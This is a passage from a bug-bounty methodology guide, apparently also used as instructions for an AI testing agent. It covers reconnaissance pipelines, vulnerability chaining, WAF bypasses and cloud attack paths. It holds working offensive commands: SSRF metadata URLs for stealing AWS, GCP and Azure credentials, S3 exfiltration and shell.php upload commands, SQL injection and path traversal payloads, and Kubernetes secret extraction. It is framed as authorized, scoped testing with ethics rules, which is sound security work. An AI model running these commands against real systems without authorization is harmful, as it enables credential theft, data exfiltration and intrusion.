- Verify authorization per endpoint
- Test indirect object references
- Check for IDOR vulnerabilities

#### D. Session & Authentication Analysis

**Session Management:**
- Analyze session token format and entropy
- Test session fixation
- Check session invalidation
- Test concurrent sessions
- Analyze session storage mechanism
- Check for session token in URL

**Token Analysis:**
- Decode JWT tokens (if used)
- Analyze token claims and permissions
- Test token refresh mechanism
- Check token expiration
- Test token revocation
- Analyze token storage mechanism

#### E. Business Logic Discovery

**Workflow Mapping:**
- Document complete user workflows
- Identify state transitions
- Map business rules and constraints
- Test workflow bypass opportunities
- Identify race condition opportunities
- Check for step-skipping vulnerabilities

**Financial Operations:**
- Analyze payment flow
- Test pricing calculations
- Check discount application
- Verify balance operations
- Test refund processes
- Analyze subscription management

---

### 33.3 AUTOMATED RECONNAISSANCE PIPELINES

#### A. Full Pipeline (Unauthenticated + Authenticated)

```bash
# Phase 1: Domain Intelligence
subfinder -d target.com -o subdomains.txt
amass enum -passive -d target.com -o amass.txt
cat subdomains.txt amass.txt | sort -u > all_subdomains.txt

# Phase 2: DNS Resolution
dnsx -l all_subdomains.txt -a -aaaa -cname -ns -txt -mx -o dns_results.txt

# Phase 3: HTTP Discovery
httpx -l all_subdomains.txt -sc -title -tech-detect -o http_results.txt

# Phase 4: Port Scanning
naabu -l all_subdomains.txt -top-ports 1000 -o ports.txt

# Phase 5: Directory Brute-Forcing
ffuf -u https://target.com/FUZZ -w /path/to/wordlist.txt -o ffuf_results.json

# Phase 6: JavaScript Analysis
katana -u https://target.com -jc -o js_urls.txt
linkfinder -i https://target.com -o cli -f results.html
secretfinder -i js_urls.txt -o secrets.txt

# Phase 7: Vulnerability Scanning
nuclei -l http_results.txt -t /path/to/nuclei-templates/ -o nuclei_results.txt
```

#### B. Authenticated Pipeline (Post-Login)

```bash
# Phase 1: Session Capture
# Export cookies from browser after login
# Use Burp/ZAP to capture authenticated traffic

# Phase 2: API Discovery
# Use mitmproxy to log all API calls
mitmproxy --mode regular --listen-port 8080

# Phase 3: Endpoint Enumeration
# Analyze captured traffic for:
# - All API endpoints
# - Request/response patterns
# - Authentication mechanisms
# - Rate limiting headers

# Phase 4: Automated Testing
# Use captured endpoints for:
# - Authorization testing
# - Input validation
# - Business logic testing
```

#### C. JavaScript Deep Analysis Pipeline

```bash
# Phase 1: Script Discovery
katana -u https://target.com -jc -d 3 -o js_files.txt

# Phase 2: Endpoint Extraction
cat js_files.txt | while read url; do
    curl -s "$url" | grep -oE '["'"'"']/[a-zA-Z0-9/_-]+["'"'"']' | sort -u
done > endpoints.txt

# Phase 3: Secret Detection
cat js_files.txt | while read url; do
    curl -s "$url" | grep -iE '(api[_-]?key|secret|token|password|credential)' 
done > secrets.txt

# Phase 4: Source Map Analysis
cat js_files.txt | while read url; do
    curl -s "${url}.map" | python3 -c "import sys,json; print(json.load(sys.stdin).get('sources',[]))"
done > source_maps.txt
```

#### D. GraphQL Reconnaissance Pipeline

```bash
# Phase 1: Introspection
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'

# Phase 2: Query Analysis
# Extract all query names
# Extract all mutation names
# Extract all subscription names
# Map type relationships

# Phase 3: Authorization Testing
# Test each query/mutation with different user contexts
# Identify permission boundaries
# Test for IDOR in GraphQL
```

---

### 33.4 MODERN ATTACK SURFACES (2025/2026)

#### A. Cloud-Native Attack Vectors

**AWS-Specific:**
- S3 bucket enumeration and misconfiguration
- Lambda function exposure
- API Gateway misconfiguration
- IAM policy analysis
- CloudFront distribution analysis
- ECS/EKS container escape
- Secrets Manager exposure

**GCP-Specific:**
- GCS bucket enumeration
- Cloud Function exposure
- IAM policy analysis
- Cloud Run misconfiguration
- Kubernetes cluster exposure

**Azure-Specific:**
- Blob storage enumeration
- Azure Function exposure
- ARM template exposure
- Managed Identity abuse
- Azure DevOps pipeline exposure

#### B. Container & Orchestration Attacks

**Docker:**
- Container escape via misconfiguration
- Docker socket exposure
- Privileged container abuse
- Environment variable exposure
- Volume mount abuse

**Kubernetes:**
- API server exposure
- etcd data exposure
- kubelet exposure
- RBAC misconfiguration
- Service account abuse
- Pod security policy bypass

#### C. Serverless Attack Vectors

**Lambda/Cloud Functions:**
- Environment variable exposure
- Function URL exposure
- Trigger manipulation
- Cold start timing attacks
- Dependency confusion

#### D. CI/CD Pipeline Attacks

**Pipeline Exposure:**
- Jenkins/GitLab CI/GitHub Actions exposure
- Build log leakage
- Credential exposure in pipelines
- Artifact manipulation
- Supply chain attacks

#### E. AI/ML Attack Vectors

**Model Attacks:**
- Model extraction via API
- Prompt injection
- Training data extraction
- Model inversion attacks
- Adversarial examples

---

### 33.5 ATTACK SURFACE EXPANSION TECHNIQUES

#### A. Subdomain Permutation

- `api-dev.target.com`, `dev-api.target.com`
- `staging.target.com`, `target-staging.com`
- `test.target.com`, `target-test.com`
- `internal.target.com`, `target-internal.com`
- `admin.target.com`, `target-admin.com`

#### B. Port & Protocol Discovery

- Common ports: 80, 443, 8080, 8443, 3000, 5000, 8000
- Admin ports: 8443, 9443, 10443
- Database ports: 3306, 5432, 27017, 6379
- Message queue ports: 5672, 9092, 1883
- Container ports: 2375, 2376 (Docker), 10250 (Kubelet)

#### C. Virtual Host Discovery

```bash
# Force virtual host discovery
ffuf -u https://IP_ADDRESS -H "Host: FUZZ.target.com" -w subdomains.txt
```

#### D. Directory Traversal for Recon

- Check for `.git`, `.svn`, `.env`
- Test for backup files (`.bak`, `.old`, `.orig`)
- Look for configuration files
- Check for source code exposure
- Test for log file access

---

### 33.6 RECON DATA ORGANIZATION

#### A. Asset Inventory Structure

```
target.com/
├── subdomains/
│   ├── active/
│   │   ├── api.target.com/
│   │   │   ├── endpoints/
│   │   │   ├── javascript/
│   │   │   └── api_docs/
│   │   ├── admin.target.com/
│   │   └── staging.target.com/
│   └── inactive/
├── endpoints/
│   ├── api_v1/
│   ├── api_v2/
│   └── web/
├── javascript/
│   ├── scripts/
│   ├── source_maps/
│   └── secrets/
├── credentials/
│   ├── api_keys/
│   ├── tokens/
│   └── secrets/
└── findings/
    ├── critical/
    ├── high/
    ├── medium/
    └── low/
```

#### B. Prioritization Matrix

| Priority | Criteria | Action |
|----------|----------|--------|
| P0 | Active admin panels, exposed credentials | Immediate testing |
| P1 | Publicly accessible APIs, debug endpoints | High priority |
| P2 | Staging/dev environments, backup files | Medium priority |
| P3 | Information disclosure, version leakage | Low priority |

---

## 34. Exploitation Chains

### 34.1 Common Chains

- IDOR → Sensitive data → Account takeover
- XSS → Cookie theft → Account takeover
- SSRF → Internal service → Credential theft
- Open redirect → Phishing → Credential theft
- Race condition → Balance manipulation → Financial impact
- Information disclosure → API key → Privilege escalation
- SSRF → Metadata → Cloud credential theft
- XSS → Admin interaction → Privilege escalation
- Cache poisoning → XSS → Account takeover
- Subdomain takeover → XSS → Cookie theft

### 34.2 Chain Analysis Methodology

For each finding, ask:

1. What does this enable?
2. Can this be combined with another finding?
3. What is the maximum impact of this chain?
4. What additional access does this provide?

---

## 35. False Positive Reduction & Accuracy Validation

**False positives waste time and destroy credibility.** Elite hunters validate every finding before reporting.

### 35.1 Validation Framework

For every suspected finding, apply this checklist:

```
□ Is the behavior reproducible? (Test 3+ times)
□ Is the impact actually exploitable? (Not just theoretical)
□ Does the server-side control fail? (Not just client-side)
□ Is there a realistic attack scenario?
□ Can you demonstrate actual data access or modification?
□ Is this within scope of the program?
□ Is this a duplicate? (Check known CVEs and prior reports)
```

### 35.2 Common False Positives by Category

**XSS False Positives:**
- Input reflected in HTML comments (not executable)
- Input in `<script>` tags but properly escaped
- Input in HTTP headers not rendered in browser
- Input in JSON responses not embedded in HTML
- Input in error pages with Content-Type: text/plain
- Input in `<noscript>` tags
- Input in `<textarea>` (requires user interaction)
- Input in JavaScript strings with proper escaping

**SQLi False Positives:**
- Generic error messages that don't indicate SQL issues
- WAF/block page responses that look like errors
- Application-level error handling that masks SQL errors
- Time-based tests affected by network latency
- Boolean-based tests affected by caching
- Tests that trigger rate limiting

**IDOR False Positives:**
- Endpoint returns same data regardless of ID (public data)
- ID is not actually user-specific (shared resources)
- Authorization check happens later in the request chain
- Response is cached and doesn't reflect actual access
- Endpoint is deprecated but still responds

**SSRF False Positives:**
- Server makes request but response is not accessible
- Request is blocked by firewall/network controls
- Request succeeds but internal service is not sensitive
- Redirect is followed but destination is validated

**Authentication Bypass False Positives:**
- Endpoint is intentionally public
- Session is maintained via different mechanism
- Authorization check happens at different layer
- Test account has unexpected permissions

### 35.3 Verification Techniques

**For XSS:**
```bash
# Use unique canary tokens
curl -X POST https://target.com/profile \
  -d "name=xss-test-$(date +%s)"

# Check if token appears in response
curl https://target.com/profile | grep "xss-test-"
```

**For SQLi:**
```bash
# Use time-based confirmation
curl -w "\n%{time_total}\n" -o /dev/null -s \
  "https://target.com/search?q=test'+OR+1=1--"

# Compare with baseline
curl -w "\n%{time_total}\n" -o /dev/null -s \
  "https://target.com/search?q=test"
```

**For IDOR:**
```bash
# Test with two different accounts
curl -H "Cookie: session=ACCOUNT_A" \
  "https://target.com/api/users/ACCOUNT_B/profile"

# Verify response is different from baseline
curl -H "Cookie: session=ACCOUNT_A" \
  "https://target.com/api/users/ACCOUNT_A/profile"
```

**For SSRF:**
```bash
# Use your own server as callback
curl "https://target.com/webhook?url=http://YOUR-SERVER/callback"

# Monitor for incoming requests
nc -l -p 8080
```

### 35.4 Confidence Scoring

Rate each finding on a confidence scale:

| Confidence | Criteria | Action |
|------------|----------|--------|
| 100% | Reproducible impact demonstrated | Report immediately |
| 80% | Impact is clear but not fully demonstrated | Continue verification |
| 60% | Likely vulnerable but impact unclear | Investigate further |
| 40% | Suspicious behavior, needs more research | Park and revisit |
| 20% | Possible issue, low confidence | Document for future |

---

## 36. High-Impact Vulnerability Focus

**Not all vulnerabilities are equal.** Focus on findings that maximize impact and bounty value.

### 36.1 Critical Impact Findings (Bounty: $5000-$50,000+)

**Remote Code Execution (RCE):**
- Command injection in user-controlled parameters
- Deserialization vulnerabilities
- Template injection leading to RCE
- File upload with execution
- Server-side request forgery → internal code execution

**Authentication Bypass → Account Takeover:**
- Complete authentication bypass
- Password reset logic flaws
- Session fixation leading to account takeover
- OAuth flow vulnerabilities
- JWT vulnerabilities enabling unauthorized access

**Privilege Escalation:**
- Horizontal privilege escalation (user → user)
- Vertical privilege escalation (user → admin)
- Mass assignment of role/permission fields
- Missing authorization checks on admin endpoints

**Data Breach:**
- SQL injection with data exfiltration
- IDOR accessing other users' PII
- API endpoints exposing sensitive data
- GraphQL queries bypassing authorization

### 36.2 High Impact Findings (Bounty: $1000-$5000)

**Stored XSS:**
- XSS in user profile fields
- XSS in file upload metadata
- XSS in admin panel
- XSS in email templates

**SSRF → Internal Access:**
- SSRF to cloud metadata (credential theft)
- SSRF to internal admin panels
- SSRF to internal databases
- SSRF to internal APIs

**Business Logic:**
- Payment bypass
- Balance manipulation
- Subscription bypass
- Coupon/discount abuse

**Race Conditions:**
- Double-spending vulnerabilities
- Balance manipulation via concurrency
- Reward duplication

### 36.3 Finding Priority Matrix

| Vulnerability | Impact | Exploitability | Bounty Range | Priority |
|---------------|--------|----------------|--------------|----------|
| RCE | Critical | Medium | $5K-$50K+ | P0 |
| Auth Bypass | Critical | High | $5K-$25K | P0 |
| SQLi + Data | Critical | Medium | $3K-$15K | P0 |
| Privilege Escalation | High | High | $2K-$10K | P1 |
| Stored XSS (Admin) | High | Medium | $1K-$5K | P1 |
| SSRF → Cloud | High | Medium | $2K-$10K | P1 |
| IDOR + PII | High | High | $1K-$5K | P1 |
| Business Logic | High | Low | $1K-$5K | P1 |
| Race Condition | Medium | Low | $500-$2K | P2 |
| Reflected XSS | Medium | High | $500-$1K | P2 |
| Open Redirect | Low | High | $100-$500 | P3 |

---

## 37. Advanced Bypass Techniques

### 37.1 WAF Bypass

**Input Encoding:**
- URL encoding (`%27` for `'`)
- Double URL encoding (`%2527`)
- Unicode encoding (`\u0027`)
- HTML encoding (`&#39;`)
- Base64 encoding
- Hex encoding (`0x27`)

**Case Manipulation:**
- Mixed case (`SeLeCt`, `uNiOn`)
- Case-insensitive keywords

**Comment Injection:**
- SQL comments (`/**/`)
- Inline comments (`/*!50000UNION*/`)
- Multi-line comments

**Chunked Transfer:**
- Split payloads across chunks
- Use chunk extensions

**Parameter Pollution:**
- Duplicate parameters
- Parameter name manipulation

### 37.2 Authentication Bypass

**Session Manipulation:**
- Session token prediction
- Session fixation
- Cookie manipulation
- Token reuse

**Logic Bypass:**
- Workflow step skipping
- State machine manipulation
- Race conditions on authentication

### 37.3 Authorization Bypass

**HTTP Method Override:**
- `X-HTTP-Method-Override: DELETE`
- `_method=DELETE` parameter
- `X-HTTP-Method` header

**API Version Bypass:**
- Test deprecated API versions
- Version parameter manipulation

**Path Traversal Bypass:**
- URL encoding
- Double encoding
- Unicode normalization
- Null byte injection

### 37.4 Input Validation Bypass

**Type Juggling:**
- String to integer conversion
- Array parameter injection
- Null/undefined handling

**Parser Differential:**
- JSON vs form-encoded
- XML vs JSON
- Multipart vs url-encoded

**Encoding Bypass:**
- Character set switching
- Encoding normalization
- Unicode tricks

---

## 38. Vulnerability Chaining Methodology

### 38.1 Chain Construction Framework

**Step 1: Identify Starting Point**
- What can you control?
- What can you access?
- What information do you have?

**Step 2: Identify Pivot Points**
- What does each finding enable?
- What additional access is gained?
- What new attack surface is revealed?

**Step 3: Identify End Goal**
- Account takeover
- Data breach
- Privilege escalation
- Financial impact
- Server compromise

**Step 4: Build the Chain**
- Start → Pivot → Pivot → End Goal
- Verify each link in the chain
- Test the complete attack path

### 38.2 High-Value Chains

**Chain 1: Recon → Credential Theft → Account Takeover**
```
JavaScript analysis → API key discovery → API access → 
User data extraction → Account takeover
```

**Chain 2: XSS → Session Theft → Admin Access**
```
Stored XSS in profile → Admin views profile → 
Cookie theft → Admin session hijacking
```

**Chain 3: SSRF → Internal Discovery → Privilege Escalation**
```
SSRF via webhook → Internal admin panel discovery → 
Admin panel access → User promotion
```

**Chain 4: Race Condition → Financial Impact**
```
Race on coupon redemption → Multiple uses → 
Balance manipulation → Financial fraud
```

**Chain 5: IDOR → Sensitive Data → Business Impact**
```
IDOR on invoice endpoint → Access all invoices → 
Extract financial data → Business intelligence theft
```

### 38.3 Chain Validation Checklist

```
□ Is each step in the chain exploitable?
□ Does each step lead to the next?
□ Is the complete chain reproducible?
□ Is the end goal actually achievable?
□ Is the impact clearly demonstrated?
□ Is there a realistic attack scenario?
□ Is the chain within scope?
```

---

## 39. Cloud Chaining — AWS, GCP, Azure Attack Paths

**Cloud environments are the highest-value targets.** A single SSRF can cascade into full cloud account compromise.

---

### 39.1 AWS Attack Chains

#### A. SSRF → IAM Credential Theft

```
Application SSRF → http://169.254.169.254/latest/meta-data/iam/security-credentials/
→ Extract Access Key, Secret Key, Token
→ Configure AWS CLI with stolen credentials
→ Enumerate IAM permissions
→ Escalate to admin access
```

**Metadata Endpoints:**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document
```

**IMDSv2 Bypass (if IMDSv1 is disabled):**
```bash
# Get session token first
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Use token for metadata access
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

#### B. SSRF → S3 Bucket Discovery

```
SSRF → http://169.254.169.254/latest/meta-data/iam/security-credentials/
→ Extract credentials
→ aws s3 ls
→ Identify sensitive buckets
→ aws s3 sync s3://target-bucket/ ./exfiltrated/
```

**S3 Enumeration:**
```bash
# List all buckets
aws s3 ls

# Check bucket permissions
aws s3api get-bucket-acl --bucket target-bucket

# Download sensitive files
aws s3 cp s3://target-bucket/secrets.json .
```

#### C. SSRF → Lambda Function Discovery

```
SSRF → Extract IAM credentials
→ aws lambda list-functions
→ Identify function with sensitive environment variables
→ aws lambda get-function --function-name FUNCTION_NAME
→ Download function code
→ Extract secrets from environment variables
```

#### D. SSRF → RDS Database Access

```
SSRF → Extract IAM credentials
→ aws rds describe-db-instances
→ Identify database endpoints
→ If security group allows → Direct database access
→ Extract sensitive data
```

#### E. SSRF → Secrets Manager

```
SSRF → Extract IAM credentials
→ aws secretsmanager list-secrets
→ aws secretsmanager get-secret-value --secret-id SECRET_NAME
→ Extract database credentials, API keys, etc.
```

#### F. IAM Privilege Escalation Paths

**Common Privilege Escalation Patterns:**
```
iam:CreatePolicy → Attach to own role → Gain new permissions
iam:AttachUserPolicy → Attach admin policy to user
iam:CreateAccessKey → Create access key for admin user
iam:CreateLoginProfile → Create login for admin user
iam:UpdateLoginProfile → Change admin password
sts:AssumeRole → Assume privileged role
lambda:CreateFunction → Create Lambda with elevated permissions
lambda:InvokeFunction → Execute Lambda with elevated permissions
```

#### G. S3 Bucket Misconfiguration Attacks

**Public Read:**
```bash
# Check if bucket is publicly readable
curl -s http://target-bucket.s3.amazonaws.com/

# Download all files
aws s3 sync s3://target-bucket/ ./downloaded/
```

**Public Write:**
```bash
# Upload malicious file
aws s3 cp shell.php s3://target-bucket/shell.php --acl public-read
```

**Lambda Trigger Injection:**
```bash
# If bucket write is possible, trigger Lambda execution
aws s3 cp malicious.json s3://target-bucket/input/
# Lambda processes the file → potential code execution
```

---

### 39.2 GCP Attack Chains

#### A. SSRF → GCP Metadata Theft

```
SSRF → http://metadata.google.internal/computeMetadata/v1/
→ http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
→ Extract access token
→ Enumerate permissions
→ Escalate privileges
```

**Metadata Endpoints:**
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/project/attributes/
```

**Required Header:**
```bash
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

#### B. SSRF → GCS Bucket Discovery

```
SSRF → Extract access token
→ List buckets: GET https://storage.googleapis.com/storage/v1/b
→ Download sensitive files
→ Modify bucket permissions if write access
```

#### C. SSRF → Cloud Functions

```
SSRF → Extract access token
→ List functions: GET https://cloudfunctions.googleapis.com/v1/projects/PROJECT/locations/REGION/functions
→ Download function source
→ Extract secrets from environment variables
→ Deploy malicious function if write access
```

#### D. SSRF → Cloud SQL

```
SSRF → Extract access token
→ List instances: GET https://sqladmin.googleapis.com/v1/projects/PROJECT/instances
→ If authorized networks allow → Direct database access
```

#### E. GCP IAM Privilege Escalation

```
roles/iam.serviceAccountUser → Impersonate service accounts
roles/iam.serviceAccountTokenCreator → Create tokens for service accounts
roles/cloudfunctions.developer → Deploy malicious functions
roles/run.developer → Deploy malicious Cloud Run services
roles/storage.admin → Access all storage buckets
```

---

### 39.3 Azure Attack Chains

#### A. SSRF → Managed Identity Theft

```
SSRF → http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
→ Extract access token
→ Enumerate permissions
→ Access Azure resources
```

**Metadata Endpoint:**
```bash
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

#### B. SSRF → Azure Blob Storage

```
SSRF → Extract managed identity token
→ List storage accounts
→ Access blob containers
→ Download sensitive files
```

#### C. SSRF → Azure Key Vault

```
SSRF → Extract managed identity token
→ List key vaults: GET https://management.azure.com/subscriptions/SUB/resourceGroups/GRP/providers/Microsoft.KeyVault/vaults?api-version=2023-02-01
→ Access secrets: GET https://VAULT.vault.azure.net/secrets/SECRET-NAME?api-version=7.4
```

#### D. SSRF → Azure Functions

```
SSRF → Extract managed identity token
→ List function apps
→ Download function code
→ Extract connection strings and secrets
```

#### E. Azure IAM Privilege escalation

```
Microsoft.Authorization/elevateAccess → Global Admin
Microsoft.Storage/storageAccounts/listKeys/action → Access storage
Microsoft.KeyVault/vaults/read → Read key vault
Microsoft.Compute/virtualMachines/runCommand/action → Execute commands on VMs
```

---

### 39.4 Container & Kubernetes Chaining

#### A. SSRF → Kubernetes API Server

```
SSRF → http://kubernetes.default.svc:443/api/v1/namespaces/
→ If service account has permissions → Access cluster resources
→ List secrets: GET /api/v1/namespaces/NAMESPACE/secrets
→ Extract kubeconfig, certificates, tokens
```

#### B. SSRF → Container Environment Variables

```
SSRF → http://169.254.169.254/latest/meta-data/ (if ECS)
→ Or check container metadata
→ Extract database credentials, API keys from environment
```

#### C. Kubernetes Secret Extraction

```bash
# If API server access is possible
kubectl get secrets --all-namespaces
kubectl get secret SECRET_NAME -o yaml

# Decode base64 secrets
echo "BASE64_SECRET" | base64 -d
```

---

### 39.5 Multi-Cloud Attack Patterns

#### A. Cloud → On-Premise Pivoting

```
Cloud compromise → VPN credentials in metadata
→ Connect to on-premise network
→ Access internal resources
→ Full network compromise
```

#### B. Cross-Cloud Lateral Movement

```
AWS compromise → Extract credentials for GCP/Azure
→ Access multi-cloud environment
→ Compound impact
```

#### C. Supply Chain → Cloud

```
Compromised dependency → CI/CD pipeline access
→ Cloud credentials in pipeline
→ Cloud environment compromise
```

---

### 39.6 Cloud Attack Tools & Techniques

**AWS Enumeration:**
```bash
# Enumerate IAM permissions
aws iam list-attached-user-policies --user-name USERNAME
aws iam list-user-policies --user-name USERNAME
aws iam list-roles
aws iam get-account-authorization-details

# Enumerate S3
aws s3 ls
aws s3api get-bucket-policy --bucket BUCKET_NAME

# Enumerate Lambda
aws lambda list-functions
aws lambda get-function --function-name FUNCTION_NAME
```

**GCP Enumeration:**
```bash
# List projects
gcloud projects list

# List buckets
gsutil ls

# List functions
gcloud functions list

# List secrets
gcloud secrets list
```

**Azure Enumeration:**
```bash
# List resources
az resource list

# List key vaults
az keyvault list

# List storage accounts
az storage account list
```

---

### 39.7 Cloud-Specific SSRF Bypass Techniques

**IMDSv2 Bypass (AWS):**
```bash
# PUT request to get token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Use token
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/
```

**GCP Metadata Bypass:**
```bash
# Add required header
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/
```

**Azure Metadata Bypass:**
```bash
# Add required header
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

**IP Address Encoding:**
```bash
# Decimal
http://2130706433/  # 127.0.0.1

# Octal
http://0177.0.0.1/  # 127.0.0.1

# Hex
http://0x7f000001/  # 127.0.0.1

# IPv6
http://[::1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/
```

---

### 39.8 Cloud Attack Prevention & Detection

**Prevention:**
- Use IMDSv2 with hop limit
- Restrict metadata access via iptables
- Use least-privilege IAM policies
- Enable cloud audit logging
- Use VPC service controls

**Detection:**
- Monitor metadata access logs
- Alert on unusual API calls
- Track IAM policy changes
- Monitor S3 bucket access
- Log all administrative actions

---

## 40. Performance Optimization & Speed

**Elite hunters work faster by being systematic, not by rushing.**

### 40.1 Reconnaissance Speed

**Parallel Execution:**
```bash
# Run multiple tools simultaneously
subfinder -d target.com -o subdomains.txt &
amass enum -passive -d target.com -o amass.txt &
wait
cat subdomains.txt amass.txt | sort -u > all_subdomains.txt
```

**Caching & Deduplication:**
- Cache DNS results to avoid repeated lookups
- Deduplicate subdomains early
- Use hash sets for unique endpoints
- Store results in structured formats (JSON, CSV)

**Progressive Disclosure:**
- Start with broad scans, then narrow down
- Use quick scans first, deep scans for interesting targets
- Prioritize based on initial findings

### 40.2 Testing Speed

**Batch Testing:**
```bash
# Test multiple endpoints at once
cat endpoints.txt | xargs -P 10 -I {} curl -s -o /dev/null -w "%{http_code} {}\n" {}
```

**Automated Workflows:**
- Create scripts for common test patterns
- Use Burp macros for repetitive tasks
- Automate authorization testing with custom scripts

**Time Management:**
- Set time limits per vulnerability class
- Move on if no findings after threshold
- Document as you go to avoid rework

### 40.3 Reporting Speed

**Template-Based Reporting:**
- Use pre-built report templates
- Copy-paste from validated findings
- Use standardized severity ratings

**Evidence Collection:**
- Capture screenshots during testing
- Save request/response pairs
- Document steps as you perform them

---

## 41. Advanced Detection Techniques

### 41.1 Vulnerability Detection Patterns

**Error-Based Detection:**
```bash
# Look for specific error patterns
grep -iE "(syntax error|mysql|ORA-|SQL Server|PostgreSQL)" response.txt
grep -iE "(stack trace|exception|error)" response.txt
```

**Timing-Based Detection:**
```bash
# Measure response times
for i in {1..10}; do
  curl -w "%{time_total}\n" -o /dev/null -s "https://target.com/search?q=test'--"
done
```

**Behavior-Based Detection:**
- Compare responses with and without payloads
- Monitor for state changes
- Check for side effects

### 41.2 Advanced Fingerprinting

**Framework Detection:**
```bash
# Django
curl -s https://target.com/ | grep -i "csrfmiddlewaretoken"

# Laravel
curl -s https://target.com/ | grep -i "laravel_session"

# Express
curl -s -I https://target.com/ | grep -i "X-Powered-By: Express"
```

**Database Detection:**
```bash
# MySQL error
' OR 1=1-- --> MySQL error

# PostgreSQL error
' OR 1=1-- --> PostgreSQL error

# SQL Server error
' OR 1=1-- --> SQL Server error
```

### 41.3 WAF Detection & Bypass

**WAF Fingerprinting:**
```bash
# Detect WAF
curl -I https://target.com/ | grep -iE "(cloudflare|akamai|incapsula|mod_security)"
```

**WAF Bypass Patterns:**
```bash
# Case variation
SeLeCt * FrOm users

# Comment injection
Sel/**/ect/**/username/**/fr/**/om users

# Encoding bypass
%27%20OR%201%3D1%20--%20
```

---

## 42. Trick & Logic Techniques

### 42.1 Logic Flaw Patterns

**Step Skipping:**
- Complete action without completing required steps
- Skip verification in multi-step process
- Access final state without intermediate states

**State Manipulation:**
- Modify state parameters in requests
- Replay requests with different states
- Manipulate order of operations

**Business Rule Violation:**
- Negative quantities
- Zero-price items
- Exceeding maximum limits
- Bypassing cooldown periods

### 42.2 Advanced Tricks

**Parameter Pollution:**
```
?id=1&id=2  →  Backend may use last value
?id=1&id=2  →  Proxy may concatenate
```

**Content-Type Confusion:**
```
POST /api/user/update
Content-Type: application/x-www-form-urlencoded
→  Send JSON body
→  Some servers parse JSON despite content-type
```

**HTTP Method Override:**
```
POST /api/user/delete
X-HTTP-Method-Override: DELETE
→  Some frameworks respect this header
```

**Null Byte Injection:**
```
file=../../../etc/passwd%00.jpg
→  Some parsers stop at null byte
```

---

# Agent Reasoning Rules

## A. Systematic Testing Methodology

### Phase 1: Reconnaissance
1. Enumerate subdomains and endpoints
2. Identify technologies and frameworks
3. Map authentication mechanisms
4. Identify API patterns

### Phase 2: Analysis
1. Identify trust boundaries
2. Map access control mechanisms
3. Identify sensitive functionality
4. Prioritize testing targets

### Phase 3: Testing
1. Test authentication mechanisms
2. Test authorization per endpoint
3. Test input validation
4. Test business logic
5. Test for common vulnerabilities

### Phase 4: Exploitation
1. Develop proof of concept
2. Establish impact
3. Attempt to chain findings
4. Document reproduction steps

### Phase 5: Reporting
1. Document findings
2. Assess severity
3. Provide remediation
4. Submit report

## B. Severity Assessment Framework

### Critical (CVSS 9.0-10.0)
- Remote code execution
- Authentication bypass
- Privilege escalation to admin
- SQL injection with data exfiltration
- SSRF leading to cloud credential theft
- Account takeover via direct request

### High (CVSS 7.0-8.9)
- Stored XSS
- IDOR with sensitive data
- SSRF to internal services
- Business logic with financial impact
- Authentication flaws
- Race condition with financial impact

### Medium (CVSS 4.0-6.9)
- Reflected XSS
- Information disclosure
- Missing security headers
- CORS misconfiguration
- Open redirect
- Rate limiting bypass

### Low (CVSS 0.1-3.9)
- Version disclosure
- Verbose error messages
- Clickjacking
- Missing HSTS
- Cookie without Secure flag

## C. Proof of Concept Development

1. **Reproduce first:** Verify the finding is reproducible
2. **Minimal PoC:** Create minimal reproduction steps
3. **Document everything:** Include all requests and responses
4. **Assess impact:** Determine what an attacker could achieve
5. **Provide remediation:** Suggest fixes

## D. Time Management

- Spend max 30 minutes on initial recon
- Spend max 2 hours per vulnerability class
- If no findings after 4 hours, reconsider approach
- Focus on high-impact endpoints first
- Document as you go

## E. Tool Usage

- Use automated tools for recon only
- Manual testing for vulnerabilities
- Use intercepting proxy for all testing
- Document all tool usage
- Do not use destructive tools without permission

## F. Cleanup

- Remove any test accounts created
- Do not leave test data in production
- Do not modify production data
- Report any unintended damage immediately

## G. Collaboration

- Share findings with program maintainers
- Ask clarifying questions about scope
- Report duplicate findings honestly
- Provide additional context when asked
- Be professional and respectful

## H. Stay Within Scope

- Respect program rules and scope
- Use controlled test accounts
- Do not access other users' data
- Do not perform destructive testing
- Report unintended damage immediately

## I. Continuous Learning

- Study new vulnerability classes
- Read security research
- Analyze other bug bounty reports
- Practice in controlled environments
- Stay updated on new attack techniques

## J. Documentation Standards

For each finding, document:

1. **Title:** Clear, descriptive title
2. **Severity:** Based on CVSS framework
3. **Description:** What the vulnerability is
4. **Steps to reproduce:** Detailed reproduction steps
5. **Impact:** What an attacker could achieve
6. **Remediation:** How to fix the issue
7. **Proof of concept:** Request/response pairs
8. **Tools used:** Any tools used in discovery

## K. Ethical Guidelines

- Do not access other users' data without authorization
- Do not perform destructive testing
- Report unintended damage immediately
- Respect program rules and scope
- Be professional and respectful
- Do not share findings publicly before remediation
- Do not extort or threaten program maintainers
